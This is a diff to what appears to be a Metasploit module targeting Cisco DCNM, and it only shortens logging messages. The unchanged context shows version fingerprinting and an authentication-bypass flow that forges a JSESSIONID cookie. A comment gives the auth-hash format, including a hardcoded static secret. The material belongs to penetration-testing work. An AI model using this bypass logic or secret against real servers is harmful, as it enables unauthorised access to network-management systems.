@@ -89,7 +89,7 @@ class MetasploitModule < Msf::Auxiliary
       jsession = res.get_cookies.split(';')[0]
       date = Time.httpdate(res.headers['Date'])
       server_date = date.strftime('%s').to_i * 1000
-      print_good("#{peer} - Got sysTime value #{server_date}")
+      print_good("Got sysTime value #{server_date}")
 
       # auth hash format:
       # username + sessionId + sysTime + POsVwv6VBInSOtYQd9r2pFRsSe1cEeVFQuTvDfN7nJ55Qw8fMm5ZGvjmIr87GEF
@@ -125,28 +125,28 @@ class MetasploitModule < Msf::Auxiliary
 
     if res && res.code == 200
       if res.body.include?('version":"11.1(1)')
-        print_good("#{peer} - Detected DCNM 11.1(1)")
-        print_status("#{peer} - No authentication required, ready to exploit!")
+        print_good("Detected DCNM 11.1(1)")
+        print_status("No authentication required, ready to exploit!")
         noauth = true
       elsif res.body.include?('version":"11.0(1)')
-        print_good("#{peer} - Detected DCNM 11.0(1)")
-        print_status("#{peer} - Note that 11.0(1) requires valid authentication credentials to exploit")
+        print_good("Detected DCNM 11.0(1)")
+        print_status("Note that 11.0(1) requires valid authentication credentials to exploit")
         jsession = auth_v11
       elsif res.body.include?('version":"10.4(2)')
-        print_good("#{peer} - Detected DCNM 10.4(2)")
-        print_status("#{peer} - No authentication required, ready to exploit!")
+        print_good("Detected DCNM 10.4(2)")
+        print_status("No authentication required, ready to exploit!")
         jsession = auth_v10
       else
-        print_error("#{peer} - Failed to detect module version.")
+        print_error("Failed to detect module version.")
         print_error('Please contact module author or add the target yourself and submit a PR to the Metasploit project!')
         print_error(res.body)
-        print_error("#{peer} - Trying unauthenticated method for DCNM 10.4(2) and below...")
+        print_error("Trying unauthenticated method for DCNM 10.4(2) and below...")
         jsession = auth_v10
       end
     end
 
     if jsession || noauth
-      print_good("#{peer} - Successfully authenticated our JSESSIONID cookie")
+      print_good("Successfully authenticated our JSESSIONID cookie")
     else
       fail_with(Failure::Unknown, "#{peer} - Failed to authenticate JSESSIONID cookie")
     end
